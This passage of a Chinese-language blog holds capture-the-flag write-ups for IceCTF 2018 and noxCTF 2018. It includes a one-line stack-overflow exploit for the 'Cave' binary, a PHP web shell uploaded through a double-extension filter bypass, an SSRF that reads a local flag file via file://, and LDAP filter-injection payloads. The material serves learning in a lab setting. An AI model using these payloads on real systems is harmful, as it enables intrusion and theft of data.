class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def gcd(a,b):</span><br><span class="line">    if a%b == 0:</span><br><span class="line">        return b</span><br><span class="line">    else :</span><br><span class="line">        return gcd(b,a%b)</span><br><span class="line">def isPrime(n):</span><br><span class="line">  if n &lt;= 1:</span><br><span class="line">    return False</span><br><span class="line">  for i in range(2, int(math.sqrt(n)) + 1):</span><br><span class="line">    if n % i == 0:</span><br><span class="line">        return False</span><br><span class="line">  return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">S=&quot;&quot;</span><br><span class="line">url=&apos;https://3rf0c2v1ztr0i6v-anticaptcha.labs.icec.tf/&apos;</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">r=s.get(url)</span><br><span class="line">#print r.text</span><br><span class="line"></span><br><span class="line">page_text = r.text</span><br><span class="line">#print page_text</span><br><span class="line">soup = BeautifulSoup(page_text,&apos;html.parser&apos;)</span><br><span class="line">#print soup</span><br><span class="line">tags = soup.find_all(&apos;td&apos;)</span><br><span class="line">#print tags</span><br><span class="line">sum=0</span><br><span class="line">for i in range(0,len(tags),2):</span><br><span class="line">    #print str(sum)</span><br><span class="line">    s1= str(tags[i]).lstrip(&quot;&lt;td&gt;&quot;).rstrip(&quot;&lt;/td&gt;&quot;)</span><br><span class="line">    #print s1</span><br><span class="line">    if &apos;greatest common divisor&apos; in s1:</span><br><span class="line">        #print s1.split(&apos; &apos;)[7],s1.split(&apos; &apos;)[9][:-1]</span><br><span class="line">        n, m=int(s1.split(&apos; &apos;)[7]), int(s1.split(&apos; &apos;)[9][:-1])</span><br><span class="line">        #print gcd(n,m)</span><br><span class="line">        s2=gcd(n,m)</span><br><span class="line">    elif &apos;prime number&apos; in s1:</span><br><span class="line"></span><br><span class="line">        #print s1.split(&apos; &apos;)[1]</span><br><span class="line">        n=int(s1.split(&apos; &apos;)[1])</span><br><span class="line">        #print isPrime(n)</span><br><span class="line">        if isPrime(n):</span><br><span class="line">            #print &apos;true&apos;</span><br><span class="line">            s2=&apos;true&apos;</span><br><span class="line">        else:</span><br><span class="line">            #print &apos;false&apos;</span><br><span class="line">            s2=&apos;false&apos;</span><br><span class="line">    elif &apos;in the following line&apos; in s1:</span><br><span class="line">        s1 = s1.replace(&apos;\n&apos;, &apos; &apos;)</span><br><span class="line">        #print s1.split(&apos; &apos;)</span><br><span class="line">        #print s1.split(&apos; &apos;)[3][:-2]</span><br><span class="line">        word=s1.split(&apos; &apos;)[3+5+int(s1.split(&apos; &apos;)[3][:-2])]</span><br><span class="line">        if &apos;.&apos; in word:</span><br><span class="line">            word=word[:-1]</span><br><span class="line">        #print word</span><br><span class="line">        s2=word</span><br><span class="line">    elif &apos;What year is it?&apos; in s1:</span><br><span class="line">        #print &apos;2018&apos;</span><br><span class="line">        s2=&apos;2018&apos;</span><br><span class="line">    elif &apos;What color is the sky?&apos; in s1:</span><br><span class="line">        #print &apos;blue&apos;</span><br><span class="line">        s2 =&apos;blue&apos;</span><br><span class="line">    elif &apos;What is the tallest mountain on Earth?&apos; in s1:</span><br><span class="line">        #print &apos;Mount Everest&apos;</span><br><span class="line">        s2 =&apos;Mount Everest&apos;</span><br><span class="line">    elif &apos;How many planets are between Earth and the Sun?&apos; in s1:</span><br><span class="line">        #print &apos;2&apos;</span><br><span class="line">        s2 =&apos;2&apos;</span><br><span class="line">    elif &apos;Which planet is closest to the sun?&apos; in s1:</span><br><span class="line">        #print &apos;Mercury&apos;</span><br><span class="line">        s2 =&apos;Mercury&apos;</span><br><span class="line">    elif &apos;How many strings does a violin have?&apos; in s1:</span><br><span class="line">        #print &apos;4&apos;</span><br><span class="line">        s2 =&apos;4&apos;</span><br><span class="line">    elif &apos;What is the capital of Germany?&apos; in s1:</span><br><span class="line">        #print &apos;Berlin&apos;</span><br><span class="line">        s2 =&apos;Berlin&apos;</span><br><span class="line">    elif &apos;Who directed the movie Jaws?&apos; in s1:</span><br><span class="line">        #print &apos;Steven Allan Spielberg&apos;</span><br><span class="line">        &apos;&apos;&apos;Steven Spielberg&apos;&apos;&apos;</span><br><span class="line">        s2 =&apos;Steven Spielberg&apos;</span><br><span class="line">    elif &apos;What is the capital of Hawaii?&apos; in s1:</span><br><span class="line">        #print &apos;Honolulu&apos;</span><br><span class="line">        s2 =&apos;Honolulu&apos;</span><br><span class="line">    else:</span><br><span class="line">        print &apos;other!!!!&apos;</span><br><span class="line">    if i==0:</span><br><span class="line">        S+=str(sum)+&apos;=&apos;+str(s2)</span><br><span class="line">    else:</span><br><span class="line">        S +=&apos;&amp;&apos; + str(sum) + &apos;=&apos; + str(s2)</span><br><span class="line">    sum+=1</span><br><span class="line"></span><br><span class="line">print S</span><br><span class="line">#S=&quot;0=grow&quot;</span><br><span class="line">data=&#123;&apos;answer&apos;:S,&apos;submit&apos;:&apos;Submit+Answers&apos;&#125;</span><br><span class="line"></span><br><span class="line">rr=requests.post(url=url,data=data)</span><br><span class="line">print rr.text</span><br><span class="line">#print &apos;\n&apos;.join(rr.text.split(&apos;\n&apos;)[10:20])</span><br></pre></td></tr></table></figure><p>不过我原先<code>Who directed the movie Jaws?</code>答案是<code>Steven Allan Spielberg</code>，而题目答案是<code>Steven Spielberg</code>，(╯﹏╰)b</p><p><img src="/2018/09/18/Icectf2018-writeup/1536898223024.png" alt="1536898223024"></p><p>贼郁闷，这就是百度和谷歌的差吧。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536898347612.png" alt="1536898347612"></p><h4 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h4><h5 id="1-garfeld"><a href="#1-garfeld" class="headerlink" title="1.garfeld"></a><strong>1.garfeld</strong></h5><p><strong>DESCRIPTION</strong></p><p><code>You found the marketing campaign for a brand new sitcom. Garfeld! It has a secret message engraved on it. Do you think you can figure out what they&#39;re trying to say?</code></p><p>给了个<a href="https://static.icec.tf/garfield/garfeld.png" target="_blank" rel="noopener">garfeld.png</a>，按照题目的意思，应该是要解密图片下方给的那串字符串</p><p><img src="/2018/09/18/Icectf2018-writeup/1536396546979.png" alt="1536396546979"></p><p>抠出来下<code>IjgJUO{P_LOUV_AIRUS_GYQUTOLTD_SKRFB_TWNKCFT}</code>，开始以为是替换密码，搞鼓半天，后面可爱的队友“咦！为什么图片右上角有一串数字<code>07271978</code>”，手动推测一番，发现了其中的奥秘。</p><p><img src="/2018/09/18/Icectf2018-writeup/1536397118828.png" alt="1536397118828"></p><p>即可推出正确答案：<code>IceCTF{I_DONT_THINK_GRONSFELD_LIKES_MONDAYS}</code></p><h5 id="2-Ancient-Foreign-Communication（未完待续）"><a href="#2-Ancient-Foreign-Communication（未完待续）" class="headerlink" title="2.Ancient Foreign Communication（未完待续）"></a>2.Ancient Foreign Communication（未完待续）</h5><p><strong>DESCRIPTION</strong></p><p>We got word from a friend of ours lost in the depths of the Andorran jungles! Help us figure out what he is trying to tell us before its too late!<br>Note: The flag here is non-standard, in the result you should end up with some words! The flag is IceCTF{&lt;words, lowercase, including spaces&gt;}</p><p>题目给出的文本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2 A8 85 5D 5D E2 8C 9E E2 8C 9E E2 8C 9F 5B E2 A8 86 5D E2 8C 9F 5D 5D 5D E2 A8 86 E2 A8 86 E2 A8 86 E2 8C 9C 5B 5B 5B E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 A8 86 E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9E E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9F E2 8C 9D E2 8C 9D E2 A8 85 E2 A8 85 E2 8C 9E E2 8C 9E E2 A8 86 5B 5D 5D 5D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D 5D 5D E2 8C 9F 5B 5B 5B E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9F E2 8C 9D E2 8C 9D E2 8C 9D E2 8C 9D 5D 5D 5D E2 8C 9E E2 8C 9E E2 8C 9E E2 8C 9D E2 8C 9D E2 8C 9D E2 A8 86 5D E2 8C 9E E2 8C 9E</span><br></pre></td></tr></table></figure><p>保存为<code>comms.txt</code>，然后<code>xxd</code>下，写入<code>comms_new.txt</code>中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r -p comms.txt &gt; comms_new.txt</span><br></pre></td></tr></table></figure><p>其中<code>comms_new.txt</code>内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">⨅]]⌞⌞⌟[⨆]⌟]]]⨆⨆⨆⌜[[[⌝⌝⌝⌞⌝⌝⌝⌝⨆⌝⌝⌝⌞⌞⌝⌝⌝⌝⌟⌝⌝⨅⨅⌞⌞⨆[]]]⌝⌝⌝⌝]]⌟[[[⌝⌝⌝⌝⌟⌝⌝⌝⌝]]]⌞⌞⌞⌝⌝⌝⨆]⌞⌞</span><br></pre></td></tr></table></figure><h4 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h4><h5 id="1-Cave"><a href="#1-Cave" class="headerlink" title="1.Cave"></a>1.Cave</h5><p><strong>DESCRIPTION</strong></p><p>You stumbled upon a cave! I’ve heard some caves hold secrets.. can you find the secrets hidden within its depths?</p><p>这算是和队友做出来的第一个<code>pwn</code>题，让我先记住这个时间<code>2018</code>年<code>09</code>月<code>11</code>日<code>21</code>时<code>30</code>分<code>xx</code>时。</p><p>先看题目给出的源码</p><p><img src="/2018/09/18/Icectf2018-writeup/1536673525281.png" alt="1536673525281"></p><p>源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">gid_t</span> gid = getegid();</span><br><span class="line">    setresgid(gid, gid, gid);</span><br><span class="line">    system(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">message</span><span class="params">(<span class="keyword">char</span> *input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, input);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"The cave echoes.. %s\n"</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        message(argv[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Usage: ./shout &lt;message&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>shout</code>文件信息，经过测试，先试试<code>200</code>个随机字符串，由<code>cyclic 200</code>生成</p><p><img src="/2018/09/18/Icectf2018-writeup/1536673986824.png" alt="1536673986824"></p><p>尝试 <code>run 200 字符串</code>，得到以下结果</p><p><img src="/2018/09/18/Icectf2018-writeup/1536674105104.png" alt="1536674105104"></p><p>可以发现溢出结果为<code>0x61616168</code>，命令执行<code>cyclic -l 0x61616168</code>下为数值<code>28</code>。</p><p>再打开<code>ida</code>分析下</p><p><img src="/2018/09/18/Icectf2018-writeup/1536674627177.png" alt="1536674627177"></p><p><code>Fn+f5</code>下查看反汇编代码</p><p><img src="/2018/09/18/Icectf2018-writeup/1536674561868.png" alt="1536674561868"></p><p>找到<code>sheel</code>函数的地址，<code>0X0804850B</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536674710456.png" alt="1536674710456"></p><p>最后构造下<code>exp</code>：<code>./shout $(python -c &#39;print &quot;a&quot;*28 + &quot;\x0b\x85\x04\x08&quot;&#39;)</code></p><p>成功得到<code>flag</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536674891630.png" alt="1536674891630"></p><p>最终答案：<code>IceCTF{i_dont_think_cavemen_overflowed_buffers}</code></p><p>以下是自己在本地的测试</p><p>此题，在没有<code>SCP</code>得到<code>shout</code>的文件时，自己通过源码<code>shout.c</code>执行命令<code>gcc -m32 -fno-stack-protector shout.c -o shout</code>得到了本地构造的<code>shout</code></p><p>对比下<code>ida</code>中的差异，左边是题目的源文件，右边是自己构造的</p><p><img src="/2018/09/18/Icectf2018-writeup/1536675331997.png" alt="1536675331997"></p><p>发现自己构造的，执行函数地址或者<code>&quot;/bin/sh -i&quot;</code>地址均可拿到权限，而比赛原题文件只能溢出后执行函数地址<code>0x0804850B</code>。以下是<code>ida</code>中函数地址和<code>&quot;/bin/sh -i&quot;</code>地址：</p><p><code>.text:0804850B                 public shell</code></p><p>……..</p><p><code>.text:08048530                 push    offset command  ; &quot;/bin/sh -i&quot;</code></p><p>本地构造的可行<code>exp</code>：</p><p><code>./shout $(python -c &#39;print &quot;a&quot;*28+&quot;\x0b\x85\x04\x08&quot;&#39;)</code></p><p><code>./shout $(python -c &#39;print &quot;a&quot;*28+&quot;\x30\x85\x04\x08&quot;&#39;)</code></p><p><img src="/2018/09/18/Icectf2018-writeup/1536675621709.png" alt="1536675621709"></p><p>原赛题的可行<code>exp</code>:<code>./shout $(python -c &#39;print &quot;a&quot;*28 + &quot;\x0b\x85\x04\x08&quot;&#39;)</code></p><p>未完待续。。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是场长知识的比赛，持续了&lt;code&gt;7&lt;/code&gt;天，贼好玩，最大的收获:让我提起了对二进制方向学习的兴致。此篇，容我慢慢分析，后续慢慢更新，这个比赛是入门&lt;code&gt;pwn&lt;/code&gt;的绝佳学习机会。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>noxCTF2018 web解析</title>
    <link href="https://jianghuxia.github.io/2018/09/10/noxCTF2018-web%E8%A7%A3%E6%9E%90/"/>
    <id>https://jianghuxia.github.io/2018/09/10/noxCTF2018-web解析/</id>
    <published>2018-09-10T11:56:35.000Z</published>
    <updated>2018-09-10T12:39:56.949Z</updated>
    
    <content type="html"><![CDATA[<p>额~菜鸡一枚，五题只做出四题，感觉学到了新知识，写了下writeup。</p><a id="more"></a> <h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h5><p><code>What is your reference again?</code></p><p><a href="http://chal.noxale.com:5000" target="_blank" rel="noopener">http://chal.noxale.com:5000</a></p><p>打开网页，如下页面</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494190208.png" alt="1536494190208"></p><p>查看源代码，发现其中的<code>&lt;script src=&quot;js/index.js&quot;&gt;&lt;/script&gt;</code>，点进去</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494331902.png" alt="1536494331902"></p><p>嗯接着访问下，发现新的页面，抓包分析，添上头<code>Referer: http://google.com</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494546331.png" alt="1536494546331"></p><p>解码得到<code>flag</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494580454.png" alt="1536494580454"></p><p>最终答案：<code>noxCTF{G0ogL3_1s_4lW4Ys_Ur_b3ST_R3f3r3nc3}</code></p><h5 id="MyFileUploader"><a href="#MyFileUploader" class="headerlink" title="MyFileUploader"></a>MyFileUploader</h5><p><code>This is my new file uploader server. I bet you can&#39;t hack it!</code></p><p><a href="http://chal.noxale.com:8079" target="_blank" rel="noopener">http://chal.noxale.com:8079</a></p><p>是个上传题，写了个<code>shell.txt</code>，内容为&lt;?php system($_GET[‘cmd’]); ?&gt;，尝试上传</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536494868896.png" alt="1536494868896"></p><p><code>There is no .png/.jpg/.gif in that file name</code> ，尝试抓包改<code>Content-Type:image/png</code> ，发现无果。<img src="/2018/09/10/noxCTF2018-web解析/1536495853127.png" alt="1536495853127"></p><p>再改名称为<code>filename=&quot;shell.png.txt&quot;</code>，成功上传，但是发现无法解析</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536495147596.png" alt="1536495147596"></p><p>再改名称为<code>filename=&quot;shell.png.php&quot;</code>,上传的路径为<code>&#39;uploads/shell.png&#39;</code>，可见过滤到<code>.php</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536495949702.png" alt="1536495949702"></p><p>再改名称为<code>filename=&quot;shell.png.php.php&quot;</code>，成功解析</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536495398824.png" alt="1536495398824"></p><p>执行命令，<code>ls%20-la</code>，发现了个<code>7H3-FL4G-1S-H3r3</code>，<code>root</code>权限</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536495648131.png" alt="1536495648131"></p><p>再来一次命令：<code>ls%207H3-FL4G-1S-H3r3</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536496241737.png" alt="1536496241737">最终答案：<code>noxCTF{N3V3R_7RU57_07H3R5}</code></p><h5 id="hiddenDOM"><a href="#hiddenDOM" class="headerlink" title="hiddenDOM"></a>hiddenDOM</h5><p><code>I decided to create a tool that searches for</code><br><code>hidden elements inside a web pages.</code><br><code>Few days ago someone told me that my website is not so /secure/...</code><br><code>Can you check it yourself ?</code></p><p><a href="http://13.59.2.198:5588" target="_blank" rel="noopener">http://13.59.2.198:5588</a></p><p>此题说来，不算难，非常类似<code>LCTF2017</code>的签到题（别问我怎么知道，那个时候连<code>LCTF2017</code>的签到题都没做出来,印象特深），但又添加了其他的知识点，添加了题目的脑洞性（趣味性）。先放出<code>LCTF2017</code>签到题的wrtieup</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536581827700.png" alt="1536581827700"></p><p>en~就是这么简单。</p><p>打开网页，发现了一些可疑之处，可以查看网页源代码部分，或者查看控制台。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536498304037.png" alt="1536498304037"></p><p>其中js代码为以下，还给了个<code>&lt;a href=&#39;/var/www/html/flag.txt&#39; hidden&gt;-_-&lt;/a&gt;</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x3bc3=[<span class="string">"\x6D\x61\x69\x6E\x5F\x66\x6F\x72\x6D"</span>,<span class="string">"\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64"</span>,<span class="string">"\x69\x6E\x70\x75\x74"</span>,<span class="string">"\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"</span>,<span class="string">"\x6E\x61\x6D\x65"</span>,<span class="string">"\x65\x78\x70\x72\x65\x73\x73\x69\x6F\x6E"</span>,<span class="string">"\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65"</span>,<span class="string">"\x74\x79\x70\x65"</span>,<span class="string">"\x74\x65\x78\x74"</span>,<span class="string">"\x70\x6C\x61\x63\x65\x68\x6F\x6C\x64\x65\x72"</span>,<span class="string">"\x2F\x3C\x5B\x5E\x3C\x3E\x5D\x7B\x31\x2C\x7D\x68\x69\x64\x64\x65\x6E\x5B\x5E\x3C\x3E\x5D\x7B\x31\x2C\x7D\x3E\x2F"</span>];<span class="keyword">var</span> _frss=<span class="built_in">document</span>[_0x3bc3[<span class="number">1</span>]](_0x3bc3[<span class="number">0</span>]);<span class="keyword">var</span> _xEger=<span class="built_in">document</span>[_0x3bc3[<span class="number">3</span>]](_0x3bc3[<span class="number">2</span>]);_xEger[_0x3bc3[<span class="number">6</span>]](_0x3bc3[<span class="number">4</span>],_0x3bc3[<span class="number">5</span>]);_xEger[_0x3bc3[<span class="number">6</span>]](_0x3bc3[<span class="number">7</span>],_0x3bc3[<span class="number">8</span>]);_xEger[_0x3bc3[<span class="number">6</span>]](_0x3bc3[<span class="number">9</span>],_0x3bc3[<span class="number">10</span>])</span><br></pre></td></tr></table></figure><p>尝试<code>16</code>进制解码下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _frss = <span class="built_in">document</span>[<span class="string">'getElementById'</span>](<span class="string">'main_form'</span>);</span><br><span class="line"><span class="keyword">var</span> _xEger = <span class="built_in">document</span>[<span class="string">'createElement'</span>](<span class="string">'input'</span>);</span><br><span class="line">_xEger[<span class="string">'setAttribute'</span>](<span class="string">'name'</span>, <span class="string">'expression'</span>);</span><br><span class="line">_xEger[<span class="string">'setAttribute'</span>](<span class="string">'type'</span>, <span class="string">'text'</span>);</span><br><span class="line">_xEger[<span class="string">'setAttribute'</span>](<span class="string">'placeholder'</span>, <span class="string">'/&lt;[^&lt;&gt;]&#123;1,&#125;hidden[^&lt;&gt;]&#123;1,&#125;&gt;/'</span>)</span><br></pre></td></tr></table></figure><p>em~，好像隐藏了什么东西，算了，先控制台调试下</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536498717396.png" alt="1536498717396"></p><p>发现调试<code>_xEger</code>的时候，有</p><input name="expression" type="text" placeholder="/<[^<>]{1,}hidden[^<>]{1,}>/"><p>经过各种调试，可以发现，<code>expression</code>这个控制了回显数据的完整性。</p><p>咯，我们测试一下，先提交<code>http://13.59.2.198:5588/index.php?target=http://13.59.2.198:5588</code>，发现是隐藏的</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499133177.png" alt="1536499133177"></p><p>再提交<code>http://13.59.2.198:5588/index.php?target=http://13.59.2.198:5588&amp;expression=/.*/</code>，发现成功显示出所有源代码。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499252455.png" alt="1536499252455"></p><p>好了，是不是有点奇怪得到这些，我们能干嘛呢？其实这题还考察了关于<code>ssrf</code>相关的知识，<code>file</code>、<code>http</code>、<code>ftp</code>的应用。是的，你猜的没错，前面源代码提示的<code>&lt;a href=&#39;/var/www/html/flag.txt&#39; hidden&gt;-_-&lt;/a&gt;</code>，这个链接是打不开的。这里额外分析下，<code>ssrf</code>的相关知识点，一般需要通过一些协议比如：<code>ftp://</code>、<code>ssh://</code>、<code>dict://</code>、<code>gopher://</code>、<code>file://</code>等获取<code>shell</code>或者一些敏感信息，此处非常这明显，<code>flag.txt</code>我们打不开，但是又给了目录，所以通过<code>file</code>协议读取成为解题的关键步骤</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499630823.png" alt="1536499630823"></p><p>这里我们用<code>file</code>协议去读<code>flag</code>的目录，构造<code>http://13.59.2.198:5588/index.php?target=file:///var/www/html/flag.txt</code>，发现是空的</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499781263.png" alt="1536499781263"></p><p>通过上面的分析，我们再次构造，后面加上个<code>&amp;expression=/.*/</code>，得到<code>flag</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536499736586.png" alt="1536499736586"></p><p>最终答案：<code>noxCTF{/[h1DD3N]*[55Rf]*[r393X]*/}</code></p><h5 id="Dictionary-of-obscure-sorrows"><a href="#Dictionary-of-obscure-sorrows" class="headerlink" title="Dictionary of obscure sorrows"></a>Dictionary of obscure sorrows</h5><p><code>There are a lot of obscure sorrows in our world.</code><br><code>Your job is not to find those that are plain in sight;</code><br><code>You need to seek further, look deeper.</code><br><code>Find the word that can not be written.</code><br><code>The most obscure sorrow of them all.</code></p><p><a href="http://54.152.220.222/" target="_blank" rel="noopener">http://54.152.220.222/</a></p><p>这题，先说说感受吧。感觉、有点小难度，但是可以通过学习，得到题解，关键是这次是我第一次玩LDAP注入，这种注入，感觉国内<code>ctf</code>赛事，考察的不是很多。</p><p>打开链接，呈现以下网页。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539086827.png" alt="1536539086827"></p><p>手工<code>fuzz</code>一番，发现无果。御剑、<code>awvs</code>扫一番，<code>awvs</code>倒是有一些线索，发现了<code>word.php</code></p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539324248.png" alt="1536539324248"></p><p>再仔细查看了下网页的源代码，发现下面也有这些，是不是大惊小怪了？</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539474274.png" alt="1536539474274"></p><p>难道是<code>word.php</code>存在<code>sql</code>注入？测试一波无果，但是接下来的发现，让我有了其他想法。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539685160.png" alt="1536539685160"></p><p>提示<code>Missing RDN inside ObjectClass(document)</code>,网上搜索一番</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536547256883.png" alt="1536547256883"></p><p>许多词条都含有关键词<code>LDAP</code>，搜索一番，学习了下<a href="http://blog.51cto.com/407711169/1439623" target="_blank" rel="noopener">LDAP基础概念</a>（此处认真，仔细查看，否则后面看不懂）。再搜索一番<code>LDAP</code>的安全问题，其中查询到<code>LDAP</code>注入（菜鸡我第一次听到），继续搜索资料，找到<a href="https://oav.net/mirrors/LDAP-ObjectClasses.html" target="_blank" rel="noopener">LDAP ObjectClasses</a>，其中有</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536563809489.png" alt="1536563809489"></p><p>再回头看看刚刚的</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536539685160.png" alt="1536539685160"></p><p>所以我们知道了<code>ObjectClass</code>是 <code>document</code>，又因为属于<code>document</code>的有<code>11</code>种</p><ul><li><code>commonName</code></li><li><code>description</code></li><li><code>seeAlso</code></li><li><code>l</code></li><li><code>o</code></li><li><code>ou</code></li><li><code>documentTitle</code></li><li><code>documentVersion</code></li><li><code>documentAuthor</code></li><li><code>documentLocation</code></li><li><code>documentPublisher</code></li></ul><p>测试一番发现，<code>http://54.152.220.222/word.php?page=*)(|(no=*)</code>，回显页面如下</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536565484665.png" alt="1536565484665"></p><p>而<code>http://54.152.220.222/word.php?page=*)(|(seeAlso=*)</code>也是同样的<code>Query returned empty</code>，接下来的剩下的几种依次带进去，发现只有<code>documentAuthor</code>、<code>description</code>是正常的回显。</p><p>而我们又知道flag的格式是<code>noxCTF{}</code>。再通过网上搜索学习，学习了有关的<code>LDAP</code>注入的姿势，这里放出一道跟本题十分相似的<a href="http://www.networkdls.com/articles/ldapinjection.pdf" target="_blank" rel="noopener">链接</a>，其中有以下页面</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536561851198.png" alt="1536561851198"></p><p>模仿构造<code>http://54.152.220.222/word.php?page=*)(|(description=noxCTF*)</code>,可以得到<code>flag</code>。</p><p><img 